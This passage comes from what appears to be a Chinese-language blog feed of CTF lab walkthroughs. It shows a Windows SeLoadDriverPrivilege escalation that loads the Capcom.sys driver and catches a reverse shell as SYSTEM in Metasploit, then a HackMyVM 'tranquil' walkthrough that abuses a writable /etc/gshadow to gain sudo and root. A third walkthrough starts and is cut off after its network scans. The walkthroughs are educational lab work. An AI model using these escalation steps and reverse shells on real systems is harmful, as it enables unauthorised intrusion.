<h2 id="SeLoadDriverPrivilege"><a href="#SeLoadDriverPrivilege" class="headerlink" title="SeLoadDriverPrivilege"></a>SeLoadDriverPrivilege</h2><pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Chivas Regal<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">whoami</span> /priv

INFORMACIàN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci¢n                                     Estado
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio        Habilitada
SeLoadDriverPrivilege         Cargar y descargar controladores de dispositivo Habilitada
SeChangeNotifyPrivilege       Omitir comprobaci¢n de recorrido                Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso    Habilitada</code></pre>
<p>有个<code>SeLoadDriverPrivilege</code>权限, 它允许用户加载内核驱动程序并使用内核特权<br>利用参考<br><a href="https://cloud.tencent.com/developer/article/1180772">https://cloud.tencent.com/developer/article/1180772</a><br>利用起来还是比较费事的。<br>先是需要一个驱动加载器<br><a href="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp">https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp</a><br>下载下来把头文件的<code>#include &quot;stdafx.h&quot;</code>去掉然后编译就好了<br>然后需要一个驱动文件<br>下载这个<br><a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys">https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys</a><br>然后需要执行脚本的exp<br><a href="https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom">https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom</a><br>不过这个工具默认执行的cmd也就是弹出一个system权限的cmd，可以改一下修改成反弹shell的exe<br><img src="https://img.picgo.net/2024/08/08/image2a4b010a0a99baa0.png" alt="image" loading="lazy"><br><img src="https://img.picgo.net/2024/08/08/imagece049666f6c29040.png" alt="image" loading="lazy"><br>然后编译生成<code>exp.exe</code><br>然后把三个文件和一个反弹shell的exe传到靶机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>temp<span class="token operator">></span> <span class="token function">dir</span>


    Directorio: C:<span class="token punctuation">\</span>temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         <span class="token number">8</span>/8/2024   <span class="token number">2</span>:29 PM          <span class="token number">10576</span> Capcom.sys
-a----         <span class="token number">8</span>/8/2024   <span class="token number">6</span>:02 PM         <span class="token number">256512</span> exp.exe
-a----         <span class="token number">8</span>/8/2024   <span class="token number">5</span>:22 PM          <span class="token number">15360</span> LoadDriver.exe
-a----         <span class="token number">8</span>/8/2024   <span class="token number">6</span>:01 PM           <span class="token number">7168</span> reverse_shell.exe</code></pre>
<p>加载驱动</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Evil-WinRM* PS C:<span class="token punctuation">\</span>temp<span class="token operator">></span> ./LoadDriver.exe System/CurrentControlSet<span class="token punctuation">\</span>abcdefg c:<span class="token punctuation">\</span>temp<span class="token punctuation">\</span>Capcom.sys
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enabling SeLoadDriverPrivilege
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> SeLoadDriverPrivilege Enabled
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Loading Driver: <span class="token punctuation">\</span>Registry<span class="token punctuation">\</span>User<span class="token punctuation">\</span>S-1-5-21-3046175042-3013395696-775018414-1108<span class="token punctuation">\</span>System/CurrentControlSet<span class="token punctuation">\</span>abcdefg
NTSTATUS: c0000034, WinError: <span class="token number">0</span></code></pre>
<p>执行exp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>temp<span class="token operator">></span> ./exp.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Capcom.sys exploit
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Capcom.sys handle was obtained as 0000000000000064
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Shellcode was placed at 000001E7D5380008
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Shellcode was executed
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Token stealing was successful
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> The SYSTEM shell was launched
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Press any key to <span class="token builtin class-name">exit</span> this program</code></pre>
<p>弹回shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.69.3:4567 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Command shell session <span class="token number">2</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.69.3:4567 -<span class="token operator">></span> <span class="token number">192.168</span>.69.69:49839<span class="token punctuation">)</span> at <span class="token number">2024</span>-08-08 <span class="token number">18</span>:27:11 +0800

Shell Banner:
Microsoft Windows <span class="token punctuation">[</span>Versi_n <span class="token number">10.0</span>.14393<span class="token punctuation">]</span>
-----
          
C:<span class="token punctuation">\</span>temp<span class="token operator">></span>whoami
<span class="token function">whoami</span>
nt authority<span class="token punctuation">\</span>system</code></pre>
<p>拿下。</p>
]]></content>
      <categories>
        <category>thehackerlabs</category>
      </categories>
      <tags>
        <tag>enumprinters</tag>
        <tag>SeLoadDriverPrivilege</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-tranquil</title>
    <url>/posts/794033c8/</url>
    <content><![CDATA[<p><strong>难度:Meduim</strong></p>
<p><strong>kali:192.168.1.101</strong></p>
<p><strong>靶机:192.168.1.107</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                <span class="token punctuation">[</span><span class="token number">21</span>:18:54<span class="token punctuation">]</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.101
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1	<span class="token number">78</span>:60:5b:04:b4:8c	TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.104	<span class="token number">44</span>:e5:17:0a:27:01	Intel Corporate
<span class="token number">192.168</span>.1.107	08:00:27:ad:41:e5	PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.107
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">22</span>:01 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.107
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00012s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65534</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>
MAC Address: 08:00:27:AD:41:E5 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.03</span> seconds</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.1.107 <span class="token parameter variable">-p21</span>             <span class="token punctuation">[</span><span class="token number">22</span>:01:25<span class="token punctuation">]</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">22</span>:02 CST
Nmap scan report <span class="token keyword">for</span> SOUPEDECODE.LOCAL <span class="token punctuation">(</span><span class="token number">192.168</span>.1.107<span class="token punctuation">)</span>
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00022s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> 0e:03:3b:78:00:29:1d:ba:60:86:0e:d3:bb:7e:3c:04 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> 2a:47:4d:9c:ce:07:61:ca:f0:ca:58:8b:5b:0f:d4:db <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 6c:42:50:a5:60:e9:0f:37:0f:be:ec:d1:20:74:29:9c <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token operator">|</span>_ftp-bounce: ERROR: Script execution failed <span class="token punctuation">(</span>use <span class="token parameter variable">-d</span> to debug<span class="token punctuation">)</span>
MAC Address: 08:00:27:AD:41:E5 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre>
<p>21端口既有ftp服务，又有ssh服务，头回见。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">curl</span> <span class="token number">192.168</span>.1.107:21                                                <span class="token punctuation">[</span><span class="token number">22</span>:08:23<span class="token punctuation">]</span> <span class="token operator">&lt;</span>img <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"tranquil.jpg"</span><span class="token operator">></span>


<span class="token operator">&lt;</span><span class="token operator">!</span>-- We are one, humans, computers and ports.
- guru --<span class="token operator">></span>
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token number">192.168</span>.1.107 <span class="token number">21</span>                                                  <span class="token punctuation">[</span><span class="token number">22</span>:08:29<span class="token punctuation">]</span> SSH-2.0-OpenSSH_8.4p1 Debian-5
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> <span class="token number">192.168</span>.1.107 <span class="token parameter variable">-P</span> <span class="token number">21</span>                                              <span class="token punctuation">[</span><span class="token number">22</span>:10:40<span class="token punctuation">]</span> ssh: connect to <span class="token function">host</span> <span class="token number">192.168</span>.1.107 port <span class="token number">22</span>: Connection refused
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> <span class="token number">192.168</span>.1.107 <span class="token parameter variable">-p</span> <span class="token number">21</span>                                              <span class="token punctuation">[</span><span class="token number">22</span>:13:37<span class="token punctuation">]</span> The authenticity of <span class="token function">host</span> <span class="token string">'[192.168.1.107]:21 ([192.168.1.107]:21)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:i8/S1lOUvm1L+Qzh42YuM939O+JPLeEzuoZ4tTC7kfE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token punctuation">[</span><span class="token number">192.168</span>.1.107<span class="token punctuation">]</span>:21<span class="token string">' (ED25519) to the list of known hosts.
root@192.168.1.107'</span>s password:

root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ftp</span> <span class="token number">192.168</span>.1.107                                                    <span class="token punctuation">[</span><span class="token number">22</span>:13:50<span class="token punctuation">]</span> Connected to <span class="token number">192.168</span>.1.107.
SSH-2.0-OpenSSH_8.4p1 Debian-5
ftp<span class="token operator">></span> <span class="token function">ls</span>
Not connected.
ftp<span class="token operator">></span></code></pre>
<p>尝试一下发现还有一个web服务,原来是SSLH技术。<br><img src="https://ooo.0x0.ooo/2024/08/17/Otv38b.png" alt="Otv38b.png" loading="lazy"></p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://ooo.0x0.ooo/2024/08/17/Otv6SD.png" alt="Otv6SD.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/08/17/Otv8wF.png" alt="Otv8wF.png" loading="lazy"><br>给了个用户名<code>guru</code>,我真怕这个图片做了隐写。<br>先扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.1.107:21/ <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                 <span class="token punctuation">[</span><span class="token number">22</span>:08:14<span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.1.107:21/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              txt,php,bak,zip,html
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">84</span><span class="token punctuation">]</span>
Progress: <span class="token number">258835</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">19.56</span>%<span class="token punctuation">)</span>^C</code></pre>
<p>不用扫了，信息肯定在图片里。根据图片上的彩色图案，找到一个编码<code>hexahue cipher</code><br><img src="https://ooo.0x0.ooo/2024/08/17/Otvun6.png" alt="Otvun6.png" loading="lazy"><br>一一对照之后得到<code>KEEPCALM</code>,尝试登录ssh。</p>
<h2 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h2><p>换成小写登录成功。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> guru@192.168.1.107 <span class="token parameter variable">-p</span> <span class="token number">21</span>                                         <span class="token punctuation">[</span><span class="token number">22</span>:41:49<span class="token punctuation">]</span> guru@192.168.1.107<span class="token string">'s password:
Permission denied, please try again.
guru@192.168.1.107'</span>s password:
Permission denied, please try again.
guru@192.168.1.107's password:
Linux tranquil <span class="token number">5.10</span>.0-8-686-pae <span class="token comment">#1 SMP Debian 5.10.46-5 (2021-09-23) i686</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Sep <span class="token number">30</span> 09:04:21 <span class="token number">2021</span> from <span class="token number">192.168</span>.1.51
guru@tranquil:~$</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ <span class="token function">cat</span> user.txt
HMVbecauseweare</code></pre>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传入linpeas分析发现gshadow可写<br><img src="https://ooo.0x0.ooo/2024/08/17/OtvIDP.png" alt="OtvIDP.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ <span class="token function">cat</span> /etc/gshadow
root:*::
daemon:*::
bin:*::
sys:*::
adm:*::
tty:*::
disk:*::
lp:*::
mail:*::
news:*::
uucp:*::
man:*::
proxy:*::
kmem:*::
dialout:*::
fax:*::
voice:*::
cdrom:*::guru
floppy:*::guru
tape:*::
sudo:*::
audio:*::guru
dip:*::guru
www-data:*::
backup:*::
operator:*::
list:*::
irc:*::
src:*::
gnats:*::
shadow:*::
utmp:*::
video:*::guru
sasl:*::
plugdev:*::guru
staff:*::
games:*::
users:*::
nogroup:*::
systemd-timesync:<span class="token operator">!</span>::
systemd-journal:<span class="token operator">!</span>::
systemd-network:<span class="token operator">!</span>::
systemd-resolve:<span class="token operator">!</span>::
input:<span class="token operator">!</span>::
kvm:<span class="token operator">!</span>::
render:<span class="token operator">!</span>::
crontab:<span class="token operator">!</span>::
netdev:<span class="token operator">!</span>::guru
messagebus:<span class="token operator">!</span>::
ssh:<span class="token operator">!</span>::
guru:<span class="token operator">!</span>::
systemd-coredump:<span class="token operator">!</span>*::
sslh:<span class="token operator">!</span>::</code></pre>
<p>可以修改密码进行组的切换，测试发现直接以root组没法还是没权限读取&#x2F;root目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> ta0
<span class="token variable">$1</span><span class="token variable">$E1dZFJ7Z</span><span class="token variable">$MH9CYHuTL1DuDtPTvveCf</span><span class="token builtin class-name">.</span>
guru@tranquil:~$ <span class="token function">nano</span> /etc/gshadow
guru@tranquil:~$ newgrp root
Password: 
guru@tranquil:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>guru<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>guru<span class="token punctuation">)</span>
guru@tranquil:~$ <span class="token function">cat</span> /root/r*
cat: <span class="token string">'/root/r*'</span><span class="token builtin class-name">:</span> Permission denied
drwx------   <span class="token number">3</span> root root  <span class="token number">4096</span> Sep <span class="token number">30</span>  <span class="token number">2021</span> root</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">-rw-r----- <span class="token number">1</span> root shadow <span class="token number">899</span> Sep <span class="token number">30</span>  <span class="token number">2021</span> /etc/shadow</code></pre>
<p>shadow文件也只能root用户写，回头发现有个sudo组可以利用</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sudo:*::</code></pre>
<p>加个密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sudo:<span class="token variable">$1</span><span class="token variable">$E1dZFJ7Z</span><span class="token variable">$MH9CYHuTL1DuDtPTvveCf</span>.::</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ newgrp <span class="token function">sudo</span>
Password: 
guru@tranquil:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> guru: 
Matching Defaults entries <span class="token keyword">for</span> guru on tranquil:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User guru may run the following commands on tranquil:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL</code></pre>
<p>已经拿到完全的sudo权限，所以可以直接切换到root</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">guru@tranquil:~$ <span class="token function">sudo</span> <span class="token function">bash</span>
root@tranquil:/home/guru<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@tranquil:/home/guru<span class="token comment"># cat ~/r*</span>
HMVyourfriends</code></pre>

]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>SSLH</tag>
        <tag>hexahue-cipher</tag>
        <tag>gshadow</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Kitty</title>
    <url>/posts/3e9b59e6/</url>
    <content><![CDATA[<p><strong>难度:hard</strong></p>
<p><strong>kali:192.168.1.105</strong></p>
<p><strong>靶机:192.168.1.106</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                                                                                                                                                                              <span class="token punctuation">[</span><span class="token number">19</span>:33:09<span class="token punctuation">]</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.105
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.1.1	<span class="token number">78</span>:60:5b:04:b4:8c	TP-LINK TECHNOLOGIES CO.,LTD.
<span class="token number">192.168</span>.1.104	<span class="token number">44</span>:e5:17:0a:27:01	Intel Corporate
<span class="token number">192.168</span>.1.106	08:00:27:d1:35:ce	PCS Systemtechnik GmbH</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜   nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.106                                                                                                                                                     <span class="token punctuation">[</span><span class="token number">19</span>:37:19<span class="token punctuation">]</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-16 <span class="token number">19</span>:37 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.106
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00045s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
<span class="token number">3000</span>/tcp <span class="token function">open</span>  ppp</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.1.106 -p22,80,3000                                                                                                                                                                   <span class="token punctuation">[</span><span class="token number">19</span>:37:42<span class="token punctuation">]</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-16 <span class="token number">19</span>:38 CST
Nmap scan report <span class="token keyword">for</span> tripladvisor <span class="token punctuation">(</span><span class="token number">192.168</span>.1.106<span class="token punctuation">)</span>
